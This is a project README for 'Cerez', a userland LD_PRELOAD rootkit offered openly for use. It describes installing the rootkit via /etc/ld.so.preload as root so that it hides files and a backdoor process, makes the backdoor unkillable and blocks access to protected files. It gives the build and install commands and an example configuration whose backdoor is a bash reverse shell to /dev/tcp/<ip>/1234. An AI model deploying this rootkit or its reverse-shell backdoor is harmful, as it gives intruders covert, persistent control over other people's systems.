<h1 align="center">
  <img src="assets/showcase.png"/>  
  <br>
  <br>
  Cerez 😈 Simple userland LD_PRELOAD rootkit
</h1>

Cerez is a configurable userland `LD_PRELOAD` rootkit, by installing it 
into `/etc/ld.so.preload`, you can preload it before every binary.
It can protect/hide your backdoor as well other files you want 
hidden. It does so by overwriting (g)libc functions such as `open`, `unlinkat` etc.

## Features
- ✔ Hides files in the file system 
- ✔ Hides your backdoor in the process list 
- ❌ Hides connections in the network list
- ✔ Makes your backdoor unkillable 
- ✔ Makes files unaccessable

## Install 
> [!Warning]
> Don't forget to edit `cerez.cfg` before install 

### You will need to install `build-essential` and `libconfig` to compile!
You can install it with `apt` on debian based systems:
```bash
apt update && apt install build-essential libconfig-dev
```
You also may want to install git in order to obtain the source.

To compile the rootkit, run the following commands:
as **ROOT**:
```bash
git clone https://github.com/ngn13/cerez.git && cd cerez
make && make install
cd .. && rm -rf cerez
```
These commands will compile and install the rootkit and the configuration
to the system.

## Config (`/etc/cerez.cfg`)
Configuration is (really) simple, there are only 3 options:

- `backdoor`: Your backdoor command, this will be run by the rootkit everytime a program starts (if its not already running). Your
backdoor will be hidden in the process list. It will also be unkillable.
- `shell`: The shell that will be used to run the `backdoor` command.
- `hidden`: A list files that you want to hide and protect. These files will be hidden in directory listings and any attempt access
them will fail, and a fake file will be accessed instead.

Here is an example configuration:
```
backdoor = "bash -i >& /dev/tcp/<ip>/1234 0>&1"
shell = "/bin/bash"
hidden = (
  { path = "/etc/cerez.cfg" },
  { path = "/etc/ld.so.preload" },
  { path = "/path/to/your/super/secret/file" }
)
```
Note that after hiding `/etc/cerez.cfg` **you won't be able to access it unless you are running as the backdoor process**.

## Resources
To learn more about `LD_PRELOAD` rootkits, I highly recommend you read [this
article](https://compilepeace.medium.com/memory-malware-part-0x2-writing-userland-rootkits-via-ld-preload-30121c8343d5).
I also left some comments in the [loader.c](rootkit/loader.c) so you can go ahead and read it.

Also this is free (as in freedom) software! So feel free to fork and improve the project.
If you are interested, you can also contribute back to the project by creaint an issue or a pull request.
